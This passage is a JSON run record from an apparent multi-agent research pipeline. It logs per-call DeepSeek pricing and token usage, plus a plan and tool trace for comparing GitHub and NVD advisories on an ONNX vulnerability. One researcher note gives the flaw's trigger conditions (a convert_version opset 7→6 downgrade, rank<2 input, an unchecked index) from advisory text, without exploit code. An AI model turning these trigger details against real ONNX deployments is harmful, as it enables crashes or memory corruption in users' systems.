+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:22+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000344766,
+            "amount_decimal": "0.000344766",
+            "amount_min": 0.000344766,
+            "amount_max": 0.000344766,
+            "amount_min_decimal": "0.000344766",
+            "amount_max_decimal": "0.000344766",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 4549,
+              "completion_tokens": 190,
+              "prompt_cache_hit_tokens": 3072,
+              "prompt_cache_miss_tokens": 1477,
+              "total_tokens": 4739
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:25+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000757266,
+            "amount_decimal": "0.000757266",
+            "amount_min": 0.000757266,
+            "amount_max": 0.000757266,
+            "amount_min_decimal": "0.000757266",
+            "amount_max_decimal": "0.000757266",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 7387,
+              "completion_tokens": 168,
+              "prompt_cache_hit_tokens": 3072,
+              "prompt_cache_miss_tokens": 4315,
+              "total_tokens": 7555
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:27+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.001815852,
+            "amount_decimal": "0.001815852",
+            "amount_min": 0.001815852,
+            "amount_max": 0.001815852,
+            "amount_min_decimal": "0.001815852",
+            "amount_max_decimal": "0.001815852",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 8590,
+              "completion_tokens": 973,
+              "prompt_cache_hit_tokens": 384,
+              "prompt_cache_miss_tokens": 8206,
+              "total_tokens": 9563
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:28+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.001067838,
+            "amount_decimal": "0.001067838",
+            "amount_min": 0.001067838,
+            "amount_max": 0.001067838,
+            "amount_min_decimal": "0.001067838",
+            "amount_max_decimal": "0.001067838",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 6089,
+              "completion_tokens": 477,
+              "prompt_cache_hit_tokens": 896,
+              "prompt_cache_miss_tokens": 5193,
+              "total_tokens": 6566
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:32+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          }
+        ],
+        "exchange_rate_applied": false
+      },
+      "pricing": {
+        "status": "confirmed",
+        "unique_calls": 5,
+        "duplicates_ignored": 0,
+        "unknown_calls": 0,
+        "estimated_calls": 0,
+        "currency_totals": {
+          "USD": {
+            "complete": true,
+            "amount": 0.004340976,
+            "amount_decimal": "0.004340976",
+            "known_subtotal_min": 0.004340976,
+            "known_subtotal_max": 0.004340976,
+            "known_subtotal_min_decimal": "0.004340976",
+            "known_subtotal_max_decimal": "0.004340976",
+            "amount_min": 0.004340976,
+            "amount_max": 0.004340976,
+            "priced_calls": 5,
+            "unknown_calls": 0
+          }
+        },
+        "calls": [
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000355254,
+            "amount_decimal": "0.000355254",
+            "amount_min": 0.000355254,
+            "amount_max": 0.000355254,
+            "amount_min_decimal": "0.000355254",
+            "amount_max_decimal": "0.000355254",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 945,
+              "completion_tokens": 544,
+              "prompt_cache_hit_tokens": 768,
+              "prompt_cache_miss_tokens": 177,
+              "total_tokens": 1489
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:22+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000344766,
+            "amount_decimal": "0.000344766",
+            "amount_min": 0.000344766,
+            "amount_max": 0.000344766,
+            "amount_min_decimal": "0.000344766",
+            "amount_max_decimal": "0.000344766",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 4549,
+              "completion_tokens": 190,
+              "prompt_cache_hit_tokens": 3072,
+              "prompt_cache_miss_tokens": 1477,
+              "total_tokens": 4739
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:25+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000757266,
+            "amount_decimal": "0.000757266",
+            "amount_min": 0.000757266,
+            "amount_max": 0.000757266,
+            "amount_min_decimal": "0.000757266",
+            "amount_max_decimal": "0.000757266",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 7387,
+              "completion_tokens": 168,
+              "prompt_cache_hit_tokens": 3072,
+              "prompt_cache_miss_tokens": 4315,
+              "total_tokens": 7555
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:27+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.001815852,
+            "amount_decimal": "0.001815852",
+            "amount_min": 0.001815852,
+            "amount_max": 0.001815852,
+            "amount_min_decimal": "0.001815852",
+            "amount_max_decimal": "0.001815852",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 8590,
+              "completion_tokens": 973,
+              "prompt_cache_hit_tokens": 384,
+              "prompt_cache_miss_tokens": 8206,
+              "total_tokens": 9563
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:28+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          },
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.001067838,
+            "amount_decimal": "0.001067838",
+            "amount_min": 0.001067838,
+            "amount_max": 0.001067838,
+            "amount_min_decimal": "0.001067838",
+            "amount_max_decimal": "0.001067838",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 6089,
+              "completion_tokens": 477,
+              "prompt_cache_hit_tokens": 896,
+              "prompt_cache_miss_tokens": 5193,
+              "total_tokens": 6566
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
+              "pricing_rule": "deepseek_peak_offpeak",
+              "rates_per_million": {
+                "offpeak": {
+                  "input_cache_hit": "0.003",
+                  "input_cache_miss": "0.15",
+                  "output": "0.6"
+                },
+                "peak": {
+                  "input_cache_hit": "0.006",
+                  "input_cache_miss": "0.30",
+                  "output": "1.2"
+                }
+              },
+              "assumptions": [
+                "Published USD rates; no currency conversion, credit deduction, tax or account discount is inferred.",
+                "Legacy Flash request names route to DeepSeek-V4.1-Flash at the Flash price according to the checked pricing page.",
+                "Peak is Monday-Friday 01:00-04:00 and 06:00-10:00 UTC, excluding Chinese public holidays. No holiday calendar is bundled: ambiguous peak dates yield a price interval.",
+                "This catalog records a checked price snapshot; it does not retrospectively reprice frozen experiments or certify invoice charges."
+              ]
+            },
+            "billed_at": "2026-10-13T05:47:32+00:00",
+            "pricing_periods": [
+              "offpeak"
+            ]
+          }
+        ],
+        "exchange_rate_applied": false
+      },
+      "current_attempt_billed_tokens": 0
+    },
+    "elapsed_ms": 12974.585,
+    "tool_calls": 3,
+    "agent": {
+      "version": "langgraph-source-team-v4",
+      "backend": "langgraph_role_team",
+      "status": "completed",
+      "roles": [
+        "planner",
+        "researcher",
+        "composer",
+        "verifier"
+      ],
+      "role_calls": [
+        {
+          "attempt": 1,
+          "status": "completed",
+          "billed_at": 1791870442,
+          "call_id": "planner:0",
+          "elapsed_ms": 2900.965,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "626671f331ab88b69df8247b724ac1bf0c0f843676722c435fe2ca22069171d9",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "ad6e4af8-7cd7-460c-bffa-d81aabc03189",
+          "requested_at": "2026-10-13T05:47:21.862433+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "planner",
+          "usage": {
+            "completion_tokens": 544,
+            "prompt_cache_hit_tokens": 768,
+            "prompt_cache_miss_tokens": 177,
+            "prompt_tokens": 945,
+            "total_tokens": 1489
+          }
+        },
+        {
+          "attempt": 2,
+          "status": "completed",
+          "billed_at": 1791870445,
+          "call_id": "research:0:0",
+          "elapsed_ms": 1631.722,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "82ebbe674f404ffc73dc1a44487146b529e544faa6fe26cf525c44765a876bc7",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "8682a91c-a48e-4cb2-9dff-179efb8377a5",
+          "requested_at": "2026-10-13T05:47:24.781174+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "researcher",
+          "usage": {
+            "completion_tokens": 190,
+            "prompt_cache_hit_tokens": 3072,
+            "prompt_cache_miss_tokens": 1477,
+            "prompt_tokens": 4549,
+            "total_tokens": 4739
+          }
+        },
+        {
+          "attempt": 3,
+          "status": "completed",
+          "billed_at": 1791870447,
+          "call_id": "research:0:1",
+          "elapsed_ms": 1245.016,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "67faefa5beb50d3dbeb56168a95f33ecbdcbbb751e9371514ab259da0e20c757",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "411d9a7e-429a-48e8-a019-9e404c9078fd",
+          "requested_at": "2026-10-13T05:47:26.967412+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "researcher",
+          "usage": {
+            "completion_tokens": 168,
+            "prompt_cache_hit_tokens": 3072,
+            "prompt_cache_miss_tokens": 4315,
+            "prompt_tokens": 7387,
+            "total_tokens": 7555
+          }
+        },
+        {
+          "attempt": 4,
+          "status": "completed",
+          "billed_at": 1791870448,
+          "call_id": "compose:0",
+          "elapsed_ms": 3928.85,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "71993c8c13567c543cdfd4866e4e6bfd63fe4913d8e7620f36492e69030504ed",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "b669febe-dd79-4fbd-bd4f-ccd03ac2c9f2",
+          "requested_at": "2026-10-13T05:47:28.232082+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "composer",
+          "usage": {
+            "completion_tokens": 973,
+            "prompt_cache_hit_tokens": 384,
+            "prompt_cache_miss_tokens": 8206,
+            "prompt_tokens": 8590,
+            "total_tokens": 9563
+          }
+        },
+        {
+          "attempt": 5,
+          "status": "completed",
+          "billed_at": 1791870452,
+          "call_id": "verify:0",
+          "elapsed_ms": 2453.97,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "ca44ceba3795b031c562c65d257eb2d9d3adf66b40102b40534549ad5174f301",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "9d7dd66c-3651-44e2-ab2f-3ff8ba7ccd24",
+          "requested_at": "2026-10-13T05:47:32.173469+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "verifier",
+          "usage": {
+            "completion_tokens": 477,
+            "prompt_cache_hit_tokens": 896,
+            "prompt_cache_miss_tokens": 5193,
+            "prompt_tokens": 6089,
+            "total_tokens": 6566
+          }
+        }
+      ],
+      "tool_steps": [
+        {
+          "tool": "retrieve",
+          "status": "completed",
+          "error": null,
+          "elapsed_ms": 726.694,
+          "input": {
+            "query": "CVE-2026-63632 对照 ONNX 的 GitHub 与 NVD 公告，分别给出原始 pip 范围、首次修复版本及 NVD 的版本措辞。说明触发 API 和 opset 降级路径、输入 rank 条件、未检查的索引、与 InferShapes 问题的边界，并区分 Release 与 ASan 的表现及可能影响，所有结论引用原文，不执行 PoC。",
+            "mode": "hybrid",
+            "limit": 5,
+            "event_id": null
+          },
+          "result_chars": 4221
+        },
+        {
+          "tool": "read_fields",
+          "status": "completed",
+          "error": null,
+          "elapsed_ms": 9.748,
+          "input": {
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "fields": [
+              "packages",
+              "description"
+            ],
+            "contains": null,
+            "after_offset": null,
+            "limit": 4
+          },
+          "result_chars": 5949
+        },
+        {
+          "tool": "read_fields",
+          "status": "completed",
+          "error": null,
+          "elapsed_ms": 2.488,
+          "input": {
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "after_offset": null,
+            "limit": 4
+          },
+          "result_chars": 1417
+        }
+      ],
+      "planner_usage": [
+        {
+          "completion_tokens": 544,
+          "prompt_cache_hit_tokens": 768,
+          "prompt_cache_miss_tokens": 177,
+          "prompt_tokens": 945,
+          "total_tokens": 1489
+        },
+        {
+          "completion_tokens": 190,
+          "prompt_cache_hit_tokens": 3072,
+          "prompt_cache_miss_tokens": 1477,
+          "prompt_tokens": 4549,
+          "total_tokens": 4739
+        },
+        {
+          "completion_tokens": 168,
+          "prompt_cache_hit_tokens": 3072,
+          "prompt_cache_miss_tokens": 4315,
+          "prompt_tokens": 7387,
+          "total_tokens": 7555
+        },
+        {
+          "completion_tokens": 973,
+          "prompt_cache_hit_tokens": 384,
+          "prompt_cache_miss_tokens": 8206,
+          "prompt_tokens": 8590,
+          "total_tokens": 9563
+        },
+        {
+          "completion_tokens": 477,
+          "prompt_cache_hit_tokens": 896,
+          "prompt_cache_miss_tokens": 5193,
+          "prompt_tokens": 6089,
+          "total_tokens": 6566
+        }
+      ],
+      "decisions": [
+        {
+          "cycle": 0,
+          "call_id": "research:0:0",
+          "action": "tool",
+          "tool_name": "read_fields",
+          "arguments": {
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "fields": [
+              "packages",
+              "description"
+            ],
+            "limit": 4
+          },
+          "task_ids": [
+            "gh_pip_range",
+            "gh_first_patched",
+            "nvd_version_wording",
+            "trigger_api",
+            "opset_downgrade",
+            "input_rank",
+            "unchecked_index",
+            "boundary_release_asan"
+          ],
+          "note": "已有CVE标识与NVD厂商/产品字段，但缺GitHub packages范围、首次修复版本及NVD版本措辞、触发API、opset降级、rank条件、未检查索引、InferShapes边界与Release/ASan差异。先读取GitHub公告事件f147dbc7的packages与description字段。"
+        },
+        {
+          "cycle": 0,
+          "call_id": "research:0:1",
+          "action": "tool",
+          "tool_name": "read_fields",
+          "arguments": {
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "fields": [
+              "description"
+            ],
+            "limit": 4
+          },
+          "task_ids": [
+            "nvd_version_wording"
+          ],
+          "note": "GitHub公告已给出pip范围>=1.3.0,<=1.21.0、首次修复1.22.0、触发API convert_version(model,6)、opset 7→6降级、B_shape[1]未检查索引、rank<2条件、InferShapes边界及Release/ASan差异。尚缺NVD版本措辞，读取NVD事件7bf577f3的description字段。"
+        }
+      ],
+      "research_framework": "langchain.create_agent",
+      "private_asset_details_sent_to_model": false,
+      "limits": {
+        "model_calls": 8,
+        "tool_calls": 6,
+        "deadline_seconds": 60.0,
+        "research_cycles": 2
+      },
+      "semantic_support_verified": false,
+      "final_citation_check": {
+        "verified": 5,
+        "total": 5,
+        "semantic_support_verified": false
+      },
+      "plan": {
+        "tasks": [
+          {
+            "task_id": "gh_pip_range",
+            "requirement": "从 GitHub 公告中提取 ONNX 的原始 pip 受影响版本范围（packages 字段中的 pip 范围）。",
+            "source_ids": [
+              "github-advisories"
+            ],
+            "fields": [
+              "packages"
+            ],
+            "contains": null,
+            "keywords": [
+              "pip",
+              "affected",
+              "version range",
+              "ONNX"
+            ]
+          },
+          {
+            "task_id": "gh_first_patched",
+            "requirement": "从 GitHub 公告中提取 ONNX 的首次修复版本，以 packages 的 first_patched_version 为准。",
+            "source_ids": [
+              "github-advisories"
+            ],
+            "fields": [
+              "packages"
+            ],
+            "contains": null,
+            "keywords": [
+              "first_patched_version",
+              "fixed",
+              "ONNX"
+            ]
+          },
+          {
+            "task_id": "nvd_version_wording",
+            "requirement": "从 NVD 公告的原始描述中提取其对 ONNX 受影响版本的措辞，不要求 NVD 具有 GitHub packages 的同名字段。",
+            "source_ids": [
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "version",
+              "affected",
+              "wording",
+              "ONNX"
+            ]
+          },
+          {
+            "task_id": "trigger_api",
+            "requirement": "从公告原文中提取触发该问题所涉及的 API 名称或调用方式。",
+            "source_ids": [
+              "github-advisories",
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "API",
+              "trigger",
+              "call"
+            ]
+          },
+          {
+            "task_id": "opset_downgrade",
+            "requirement": "从公告原文中提取 opset 降级路径的描述。",
+            "source_ids": [
+              "github-advisories",
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "opset",
+              "downgrade",
+              "path"
+            ]
+          },
+          {
+            "task_id": "input_rank",
+            "requirement": "从公告原文中提取输入 rank 条件。",
+            "source_ids": [
+              "github-advisories",
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "input",
+              "rank",
+              "condition"
+            ]
+          },
+          {
+            "task_id": "unchecked_index",
+            "requirement": "从公告原文中提取未检查的索引相关描述。",
+            "source_ids": [
+              "github-advisories",
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "unchecked",
+              "index"
+            ]
+          },
+          {
+            "task_id": "boundary_release_asan",
+            "requirement": "从公告原文中提取与 InferShapes 问题的边界，以及 Release 与 ASan 下表现和可能影响的区分描述。",
+            "source_ids": [
+              "github-advisories",
+              "nvd"
+            ],
+            "fields": [
+              "description"
+            ],
+            "contains": null,
+            "keywords": [
+              "InferShapes",
+              "boundary",
+              "Release",
+              "ASan",
+              "impact"
+            ]
+          }
+        ]
+      },
+      "research_trace": [
+        {
+          "cycle": 0,
+          "call_id": "research:0:0",
+          "action": "tool",
+          "tool_name": "read_fields",
+          "arguments": {
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "fields": [
+              "packages",
+              "description"
+            ],
+            "limit": 4
+          },
+          "task_ids": [
+            "gh_pip_range",
+            "gh_first_patched",
+            "nvd_version_wording",
+            "trigger_api",
